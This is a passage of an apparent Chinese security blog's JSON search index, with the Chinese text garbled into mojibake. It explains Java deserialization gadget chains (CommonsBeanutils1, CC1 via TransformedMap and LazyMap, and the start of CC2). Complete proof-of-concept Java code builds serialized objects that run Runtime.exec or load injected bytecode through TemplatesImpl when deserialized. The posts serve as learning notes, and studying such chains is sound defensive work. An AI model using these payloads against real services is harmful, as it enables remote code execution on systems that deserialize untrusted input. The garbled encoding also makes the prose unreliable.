\u0026#34;queue\u0026#34;,new Object[]{tmpl, tmpl}); å®Œæ•´pocï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.beanutils.BeanComparator; import javax.xml.transform.Transformer; import java.io.*; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsBeanutils1 { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bc = new BeanComparator(); PriorityQueue pq = new PriorityQueue(2, bc); pq.add(1); pq.add(1); setFieldValue(bc, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(pq, \u0026#34;queue\u0026#34;,new Object[]{tmpl, tmpl}); serialize(pq); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } è¿è¡ŒæŠ¥é”™äº†ï¼š\nè¯´æ˜¯æ²¡æ‰¾åˆ° org.apache.commons.collections.comparators.ComparableComparatorï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªCBæœ‰ä¸€éƒ¨åˆ†ä¾èµ–äºCCï¼Œé‚£æ·»åŠ CCä¾èµ–å³å¯ï¼Œå†æ¬¡è¿è¡ŒæˆåŠŸåŠ è½½å­—èŠ‚ç ï¼š\n",
        "summary": "javaååºåˆ—åŒ–-CBé“¾ ä»Šå¤©å­¦å­¦CBé“¾ï¼Œåœ¨CC2ä¸­æˆ‘ä»¬æ˜¯é è§¦å‘Comparatorçš„compareæ¥è¿›è¡Œååºåˆ—åŒ–è°ƒç”¨ï¼Œè¿˜æœ‰æ²¡æœ‰ç±»ä¼¼çš„è°ƒç”¨é“¾å‘¢\nApache Commons Beanutils Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šJavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•\nç®€å•æ¥çœ‹ï¼Œjava beanå°±æ˜¯ä¸€ä¸ªå±æ€§ç§æœ‰ã€æœ‰getterå’Œsetterçš„ç±»ï¼Œé£æ ¼å’Œæˆ‘ä»¬ç†Ÿæ‚‰çš„é¢å‘å¯¹è±¡å·®åˆ«ä¸å¤§\næ¯”å¦‚è¿™ä¸ªç±»D0g3erï¼Œå…¶ä¸­getterçš„æ–¹æ³•åä»¥getå¼€å¤´ï¼Œsetterçš„æ–¹æ³•åä»¥setå¼€å¤´ï¼Œå…¨åç¬¦åˆéª†é©¼å¼å‘½åæ³•ï¼ˆCamel-Caseï¼‰ï¼š\npackage com.yuy0ung; public class D0g3er { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutilsä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• PropertyUtils.getProperty ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„JavaBeançš„getteræ–¹æ³•ï¼Œæ¯”å¦‚è¿™æ ·ï¼š\npackage com.yuy0ung; import org.apache.commons.beanutils.PropertyUtils; import java.lang.reflect.InvocationTargetException; public class TestPropertyUtils { public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException { D0g3er Yuy0ung = new D0g3er(); Yuy0ung.setName(\u0026#34;Yuy0ung\u0026#34;); String name = (String) PropertyUtils.getProperty(Yuy0ung,\u0026#34;name\u0026#34;); System.out.println(name); } } æ­¤æ—¶ï¼Œcommons-beanutilsä¼šè‡ªåŠ¨æ‰¾åˆ°nameå±æ€§çš„getteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ getName ï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC1",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1/",
        "content": "javaååºåˆ—åŒ–-CC1 ccé“¾å…¥é—¨çš„ç¬¬ä¸€æ¡\nTransformedMapé“¾ ç®€å•åˆ†æäº†ä¸€æ‰‹ï¼Œä¸æ˜¯ç‰¹åˆ«æ·±å…¥ï¼Œä¸æ±‚ç”šè§£äº†å±äºæ˜¯\ndemoåˆ†æ å…ˆçœ‹è¿™ä¸ªdemoï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } è¿è¡Œä¹‹åæ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„ï¼š\nå¯ä»¥ç®€å•åˆ†æä¸€ä¸‹åŸç†ï¼š\né¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªChainedTransformerçš„å¯¹è±¡ï¼Œé‡Œé¢æ˜¯ConstantTransformerå’ŒInvokerTransformerï¼ŒConstantTransformerè·å–äº†å½“å‰ç¯å¢ƒçš„Runtimeå¯¹è±¡ï¼Œè€ŒInvokerTransformeræ‰§è¡ŒRuntimeå¯¹è±¡çš„execæ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼ˆè¿™é‡Œæ˜¯å”¤å‡ºè®¡ç®—å™¨ï¼‰ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨TransformedMap.decorateå¯¹æ–°å»ºçš„HashMapåšä¿®é¥°ï¼Œåªè¦è¿™ä¸ªmapæ–°å¢å…ƒç´ å°±ä¼šè§¦å‘å‰é¢transformerChainä¸­çš„å›è°ƒï¼Œè€Œæ¥ä¸‹æ¥çš„putæ“ä½œå°±è§¦å‘äº†è¿™ä¸ªå›è°ƒï¼Œæœ€åå¯¼è‡´å¼¹å‡ºè®¡ç®—å™¨\nå†è¯¦ç»†çœ‹çœ‹è¿™ä¸ªtransformerChainï¼Œæ¯ä¸€æ¬¡å›è°ƒéƒ½ä¼šæŒ‰é¡ºåºè°ƒç”¨å…¶ä¸­å¯¹è±¡çš„tranformæ–¹æ³•ï¼Œå½“è°ƒç”¨ConstantTransformerçš„transformæ–¹æ³•ï¼Œå°±ä¼šç›´æ¥è¿”å›æ„é€ æ—¶ä¼ å…¥çš„å¯¹è±¡å³æˆ‘ä»¬è®¾ç½®çš„Runtimeï¼š\nç„¶åæ˜¯InvokerTransformerï¼Œéœ€è¦ä¼ â¼Šä¸‰ä¸ªå‚æ•°ï¼š\nå…¶transformæ–¹æ³•ä¼šåå°„è°ƒç”¨inputå¯¹è±¡ï¼ˆåœ¨è¿™é‡Œå°±æ˜¯ä¸Šé¢ConstantTransformerè¿”å›çš„Runtimeå¯¹è±¡ï¼‰çš„imethodæ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•ä»¥åŠå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¸Šé¢ä¼ å…¥çš„execæ–¹æ³•ï¼Œå‚æ•°ä¸ºopen -a calculatorï¼š é‚£ä¹ˆè°ƒç”¨åŸç†å°±å¾ˆæ¸…æ™°äº†ï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯ï¼Œæ€ä¹ˆåœ¨ååºåˆ—åŒ–çš„readObjectä¸­è§¦å‘è¿™æ ·çš„è°ƒç”¨é“¾å‘¢\nååºåˆ—åŒ–ä¸­çš„è°ƒç”¨ ç”±äºååºåˆ—åŒ–æ—¶ä¸èƒ½æ‰‹åŠ¨å¾€mapä¸­putå…ƒç´ ï¼Œæ‰€ä»¥éœ€è¦å¦æƒ³è§¦å‘æ–¹æ³•ï¼Œè€Œsun.reflect.annotation.AnnotationInvocationHandleræ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å…¶ä¸­çš„readObjectæ–¹æ³•ï¼š æˆ‘ä»¬å¯ä»¥å¤§è‡´åˆ†æå…¶ä»£ç é€»è¾‘ï¼šéå†mapå¹¶ä¾æ¬¡è®¾ç½®å€¼ã€‚æ‰€ä»¥åªè¦è®©å…¶æ»¡è¶³æ¡ä»¶è§¦å‘è¿™é‡Œçš„memberValue.setValueå³å¯\nå› ä¸ºå‰é¢ä½¿ç”¨TransformedMap.decorateåŒ…è£…çš„åŸå› ï¼Œè¿™é‡Œçš„setValueä¼šè°ƒç”¨åˆ°AbstractInputCheckedMapDecoratorçš„setValue()æ–¹æ³•ï¼š ç„¶åä¼šè°ƒç”¨èµ·çˆ¶ç±»TransformedMapçš„checkSetValue()æ–¹æ³•:\næœ€åæ‰§è¡ŒChainedTransformerçš„Transform()æ–¹æ³•è§¦å‘æˆ‘ä»¬å‰é¢è®¾å®šçš„è°ƒç”¨é“¾ï¼š\näºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶å°†å‰é¢æ„é€ çš„HashMapè®¾ç½®è¿›æ¥ï¼Œç”±äºè¿™é‡Œçš„sun.reflect.annotation.AnnotationInvocationHandleræ˜¯åœ¨JDKå†…éƒ¨çš„ç±»ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨newæ¥å®ä¾‹åŒ–ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åå°„è·å–å®ƒçš„æ„é€ æ–¹æ³•ï¼Œå¹¶å°†å…¶è®¾ç½®æˆå¤–éƒ¨å¯è§çš„ï¼Œå†è°ƒç”¨è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°è¦æ±‚ä¼ å…¥ä¸€ä¸ªæ³¨è§£ç±»å‹ï¼ˆå³java.lang.annotation.Annotationçš„å­æ¥å£ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œé€‰æ‹©çš„Target.classï¼‰ï¼š\næ¥ä¸‹æ¥æˆ‘ä»¬å¢åŠ åºåˆ—åŒ–å’Œååºåˆ—åŒ–åŠŸèƒ½çš„ä»£ç ï¼š\npublic static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } å°è¯•è¿è¡Œï¼š æŠ¥é”™äº†ï¼ŒåŸå› æ˜¯æˆ‘ä»¬è·å–çš„Runtimeæ²¡æœ‰å®ç°java.io.Serializableæ¥å£ï¼Œæ‰€ä»¥æ˜¯ä¸èƒ½è¿›è¡Œåºåˆ—åŒ–çš„ï¼Œé‚£æ¥ä¸‹æ¥å°±è¯¥åå°„ç™»åœºäº†\nåå°„è°ƒç”¨Runtime æˆ‘ä»¬å¯ä»¥åå°„è·å–ä¸Šä¸‹æ–‡çš„Runtimeå¯¹è±¡è€Œä¸æ˜¯ç±»ï¼š\nMethod f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;open -a calculator\u0026#34;); é‚£ä¹ˆåœ¨ååºåˆ—åŒ–ä¸­å¯ä»¥åˆ©ç”¨InvokerTransformerçš„transformæ–¹æ³•æ¥åå°„è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å‡ºå¦‚ä¸‹çš„æ–¹æ³•è·å–Runtimeï¼š\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; ç°åœ¨èƒ½å¤Ÿæ­£å¸¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰æ»¡è¶³AnnotationInvocationHandlerä¸­çš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‰€ä»¥è¿˜ä¸èƒ½è°ƒç”¨setvalueæ¥è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\næœ€åçš„æ„é€  åˆ†æä¸€ä¸‹AnnotationInvocationHandlerçš„é€»è¾‘ï¼š\nè¿™é‡Œæœ‰ä¸¤æ­¥åˆ¤æ–­ï¼š\nç¬¬ä¸€æ­¥ifä¼šåˆ¤æ–­ä¼ å…¥çš„mapçš„é”®åœ¨æ³¨è§£é‡Œæ˜¯å¦æœ‰å¯¹åº”æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°Targetä¸­çš„æ–¹æ³•åªæœ‰valueï¼š\né‚£æˆ‘ä»¬å°±åœ¨mapä¸­putä¸€ä¸ªé”®å€¼å¯¹ï¼Œé”®å€¼ä¸ºvalueï¼š\nè€Œç¬¬äºŒä¸ªåˆ¤æ–­å·²ç»æ˜¯æ»¡è¶³çš„äº†ï¼š\nè¿™é‡Œæœ‰ä¸¤ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆ¤æ–­valueæ˜¯å¦ä¸ºmemberTypeç±»çš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ¤æ–­valueå¯¹è±¡æ˜¯å¦ä¸ºç”¨æ¥å­˜å¼‚å¸¸çš„ä»£ç†ç±»çš„å®ä¾‹ï¼ŒäºŒè€…å‡ä¸ºfalseï¼Œæ‰€ä»¥æ€»ä½“ä¸ºtrueï¼Œå¯ä»¥è¿›å…¥ä¸‹ä¸€æ­¥\næ‰€ä»¥æ­¤æ—¶çš„payloadæ„é€ å°±å®Œæ¯•äº†ï¼Œå†å°è¯•æ‰§è¡Œï¼š\næ­¤æ—¶çš„ååºåˆ—åŒ–å°±èƒ½èµ°åˆ°setvalueï¼Œè§¦å‘RCEäº†ï¼Œå®Œæ•´ä»£ç ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Target.class, outerMap); serialize(obj); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æ€»ç»“ æ‰€ä»¥CC1æœ€ç»ˆçš„ååºåˆ—åŒ–è°ƒç”¨é“¾å°±æ˜¯ï¼š\nObjectInputStream -\u0026gt; readObject() AnnotationInvocationHandler -\u0026gt; readObject() AbstractInputCheckedMapDecorator -\u0026gt; setValue() TransformedMap -\u0026gt; checkSetValue() ChainedTransformer -\u0026gt; transform() ConstantTransformer -\u0026gt; transform() InvokerTransformer -\u0026gt; transform() Class.getMethod() InvokerTransformer -\u0026gt; transform() Runtime.getRuntime() InvokerTransformer -\u0026gt; transform() Runtime.exec() å¦å¤–åœ¨è°ƒè¯•æ—¶å¯ä»¥çŸ¥é“ï¼Œåœ¨AbstractInputCheckedMapDecorator -\u0026gt; setValue()ä¸­ï¼Œä¼šè°ƒç”¨èµ·çˆ¶ç±»TransformedMapçš„checkSetValueæ–¹æ³•ï¼Œä»è€Œæ‰§è¡ŒChainedTransformerçš„Transform\nCC1-LazyMapé“¾ è¿™æ¡ä¹Ÿæ˜¯ysoserialä½¿ç”¨çš„é“¾å­ï¼Œä¸»è¦å°±æ˜¯ä½¿ç”¨çš„LazyMapè€Œä¸æ˜¯TransformedMapä½œä¸ºè§¦å‘ç‚¹\nLazyMap åœ¨å­¦ä¹ äº†TransformedMapè°ƒç”¨é“¾åï¼Œæˆ‘ä»¬çŸ¥é“TransformedMapæ˜¯åœ¨å†™å…¥å…ƒç´ çš„æ—¶å€™æ‰§è¡Œtransformï¼Œè€ŒLazyMapæ˜¯åœ¨å…¶getæ–¹æ³•ä¸­æ‰§è¡Œçš„ factory.transform ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å®ƒçš„getæ–¹æ³•ï¼š\nè¿™é‡Œä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼ŒLazyMapçš„ä½œç”¨æ˜¯â€œæ‡’åŠ è½½â€ï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨ factory.transform æ–¹æ³•å»è·å–ä¸€ä¸ªå€¼\nä½†æ˜¯sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectæ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆè§¦å‘å‘¢ï¼Ÿ\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œsun.reflect.annotation.AnnotationInvocationHandlerçš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getï¼š\né‚£ä¹ˆåˆè¦æ€ä¹ˆè°ƒç”¨åˆ° AnnotationInvocationHandlerçš„invokeæ–¹æ³•å‘¢ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°åŠ¨æ€ä»£ç†\nåŠ¨æ€ä»£ç† ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼š\nMap proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); å­¦ä¹ è¿‡åŠ¨æ€ä»£ç†å°±çŸ¥é“ï¼šå½“ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨ä»»æ„æ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°InvocationHandler.invoke()æ–¹æ³•è¿›è¡Œè°ƒç”¨\nå†è§‚å¯Ÿsun.reflect.annotation.AnnotationInvocationHandlerï¼Œä¼šå‘ç°å®é™…ä¸Šè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ªInvocationHandlerï¼Œæˆ‘ä»¬å¦‚æœå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨readObjectçš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ°å…¶ä¸­çš„invoke æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘LazyMapçš„getæ–¹æ³•\nè€Œæˆ‘ä»¬çŸ¥é“åœ¨AnnotationInvocationHandlerçš„readObjectä¸­ï¼Œéå†Map(proxy)æ—¶ä¼šè°ƒç”¨memberValues.entrySetæ–¹æ³•ï¼š\næ‰€ä»¥è¿™é‡Œå¯ä»¥ä½œä¸ºLazyMapçš„è§¦å‘ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥å¼€å§‹æ„é€ äº†\næ„é€  æœ‰äº†è°ƒç”¨æ€è·¯åå°±å¯ä»¥ç€æ‰‹å¼€å§‹æ„é€ äº†ï¼Œå¯ä»¥ç›´æ¥åœ¨transformdeMapé“¾åŸºç¡€ä¸Šä¿®æ”¹\né¦–å…ˆæ”¹ä¸ºä½¿ç”¨LazyMapåŒ…è£…æˆ‘ä»¬çš„HashMapï¼š ç„¶åå°±æ˜¯å¯¹sun.reflect.annotation.AnnotationInvocationHandlerå¯¹è±¡è¿›è¡ŒåŠ¨æ€ä»£ç†ï¼š\nç°åœ¨æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªä»£ç†å¯¹è±¡proxyMapï¼Œä½†ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºååºåˆ—åŒ–çš„å…¥å£åœ¨AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨AnnotationInvocationHandleræ¥åŒ…è£…proxyMap:\næ­¤æ—¶æˆ‘ä»¬å†è¿è¡Œä»£ç ï¼Œå°±ä¼šå‘ç°èƒ½å¤Ÿåœ¨ååºåˆ—åŒ–æ—¶å‘½ä»¤æ‰§è¡Œäº†ï¼š å®Œæ•´ä»£ç ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor.newInstance(Target.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); Object obj = constructor.newInstance(Target.class, proxyMap); serialize(obj); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æ€»ç»“ å®Œæ•´è°ƒç”¨é“¾ï¼š\nObjectInputStream -\u0026gt; readObject() AnnotationInvocationHandler -\u0026gt; readObject() Map(Proxy) -\u0026gt; entrySet() AnnotationInvocationHandler -\u0026gt; invoke() LazyMap -\u0026gt; get() ChainedTransformer -\u0026gt; transform() ConstantTransformer -\u0026gt; transform() InvokerTransformer -\u0026gt; transform() Class.getMethod() InvokerTransformer -\u0026gt; transform() Runtime.getRuntime() InvokerTransformer -\u0026gt; transform() Runtime.exec() ",
        "summary": "javaååºåˆ—åŒ–-CC1 ccé“¾å…¥é—¨çš„ç¬¬ä¸€æ¡\nTransformedMapé“¾ ç®€å•åˆ†æäº†ä¸€æ‰‹ï¼Œä¸æ˜¯ç‰¹åˆ«æ·±å…¥ï¼Œä¸æ±‚ç”šè§£äº†å±äºæ˜¯\ndemoåˆ†æ å…ˆçœ‹è¿™ä¸ªdemoï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } è¿è¡Œä¹‹åæ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„ï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC2",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2/",
        "content": "javaååºåˆ—åŒ–-CC2 åœ¨commons-collectionsååºåˆ—åŒ–åˆ©â½¤é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†â½€ç‰ˆæœ¬ï¼š\ncommons-collections:commons-collections\norg.apache.commons:commons-collections4\nè¿™é‡Œè¦è®²çš„çš„æ˜¯commons-collections4ï¼Œå…ˆå‰å­¦è¿‡çš„ç»å…¸çš„CC1ï¼ŒCC3ï¼ŒCC6éƒ½ä»ç„¶æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œè€Œä¸“é—¨é’ˆå¯¹commons-collections4çš„åˆ©ç”¨é“¾æœ‰ä¸¤æ¡ï¼šCC2å’ŒCC4ï¼Œè¿™é‡Œè¦è®²çš„å°±æ˜¯CC2\nç»è¿‡å‰æœŸå‡ æ¡CCé“¾çš„å­¦ä¹ ï¼Œå¯ä»¥å¤§è‡´ç†è§£åœ¨commons-collectionsä¸­æ‰¾Gadgetçš„è¿‡ç¨‹ï¼Œå®é™…ä¸Šå¯ä»¥ç®€åŒ–ä¸ºï¼Œæ‰¾â¼€æ¡ä»Serializable#readObject()â½…æ³•åˆ°Transformer#transform()â½…æ³•çš„è°ƒâ½¤é“¾\næ¥ä¸‹æ¥å›åˆ°CC2\nPriorityQueueåˆ©â½¤é“¾ CC2ä¸­â½¤åˆ°çš„ä¸¤ä¸ªå…³é”®ç±»æ˜¯ï¼š\njava.util.PriorityQueue\norg.apache.commons.collections4.comparators.TransformingComparator\nåˆ†æä¸€ä¸‹å¯ä»¥å‘ç°ï¼ŒPriorityQueueç±»æœ‰readObjectæ–¹æ³•ï¼š\nè€ŒTransformingComparatorç±»ä¸­çš„compareæ–¹æ³•è°ƒç”¨äº†transformï¼š\né‚£ä¹ˆæ¥ä¸‹æ¥çš„ç›®æ 